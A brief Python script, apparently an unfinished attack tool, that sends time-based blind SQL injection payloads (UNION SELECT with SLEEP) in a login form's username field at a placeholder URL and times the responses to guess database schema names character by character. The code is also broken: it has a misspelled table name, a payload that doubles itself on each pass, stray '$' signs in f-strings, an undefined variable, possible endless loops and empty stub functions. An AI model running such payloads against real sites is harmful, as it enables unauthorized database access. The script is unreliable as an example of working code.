#!/usr/bin/env python3
import requests, string, time

CHARACTER_SET =  string.ascii_letters + string.digits
SESSION = requests.Session()
ARBITARY_SLEEP_TIME = 5
URI = 'https://example.com'
HTTP_HEADERS = {
    'User-Agent': 'Your Bot 1.0'
}
HTTP_DATA = {
    'username': ''
}

def run_payload(payload):
    HTTP_DATA['username'] = payload
    start = time.time()
    res = SESSION.post(URI, data=HTTP_DATA)
    end = time.time()
    if end - start > ARBITARY_SLEEP_TIME:
        return True
    return False

# aka database names
def fetch_schema():
    payload = '\' UNION SELECT information_schema.schemeta WHERE SCHEMA_NAME LIKE BINARY '
    schema_list = []
    for character in CHARACTER_SET:
        payload += payload + f'${character}% ' + f'SLEEP(${ARBITARY_SLEEP_TIME}) -- '
        # if it's a match!
        if run_payload(payload):
            schema_name = character
            temp_schema_name = ''
            while True:
                for index, try_character in enumerate(CHARACTER_SET):
                    payload += payload + f'${schema_name}${c}% ' + f'SLEEP(${ARBITARY_SLEEP_TIME}) -- '
                    temp_schema_name = schema_name
                    if run_payload(payload):
                        schema_name += try_character
                # We founda a schema name!
                if schema_name == temp_schema_name:
                    print(f'Schema found in wild ${schema_name}')
                    schema_list.append(schema_name)
                    break
    return schema_list

def fetch_tables(schema_list):
    pass

if __name__ == '__main__':
    pass